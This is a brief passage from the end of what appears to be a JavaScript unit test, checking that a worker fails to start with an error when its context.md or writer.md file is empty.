    expect(() => startWorker(w.deps)).toThrow(/context\.md or writer\.md is empty/);
  });
});
